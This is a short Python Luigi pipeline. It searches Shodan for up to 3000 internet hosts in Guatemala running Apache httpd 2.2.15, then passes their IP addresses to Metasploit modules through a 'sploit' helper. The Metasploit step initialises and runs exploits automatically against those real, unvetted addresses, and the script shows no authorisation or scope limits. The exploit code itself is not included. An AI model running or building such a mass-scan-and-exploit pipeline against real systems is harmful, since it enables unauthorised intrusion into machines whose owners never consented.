import luigi
import sys
import json
sys.path.append('Msploit')
sys.path.append('Shodan')
import sploit
import collect_information

with open('api-key.json', 'r') as file:
    API_KEY = json.load(file)['key']

FACETS = [
    ('asn', 10),
    ('city' ,10),
    ('device', 10),
    ('domain', 10),
    ('isp', 10),
    ('org', 10),
    ('os', 10),
    ('port', 10),
    ('http.component', 10),
    ('http.component_category', 10),
    ('ssl.version', 10),
    ('ssl.cert.expired', 10)
]

class ShodanCollect(luigi.Task):

    def requires(self):
        return []

    def output(self):
        return luigi.LocalTarget("shodan_ip_output.json")

    def run(self):
        #collect_information.collectSummary(API_KEY, 'country:"GT"', FACETS, self.output())
        matches, ips = collect_information.searchShodan(API_KEY, 'country:"GT" product:"Apache httpd" version:"2.2.15"', 3000)
        
        with self.output().open('w') as outfile:
            json.dump(ips, outfile, indent=4)

        with open('apache_shodan_output.json', 'w') as outfile_ipv4:
            json.dump(matches, outfile_ipv4, indent=4)

class MsploitVerify(luigi.Task):

    def requires(self):
        return [ShodanCollect()]

    def output(self):
        return luigi.LocalTarget("msploit_verified.json")

    def run(self):
        print()
        with self.input()[0].open() as found_ip:
            ips = json.load(found_ip)['ipv4']
            string_ips = [s.encode('ascii') for s in ips]

        sploit.init_metasploit(string_ips)
        sploit.run_sploit()


if __name__ == '__main__':
    luigi.run()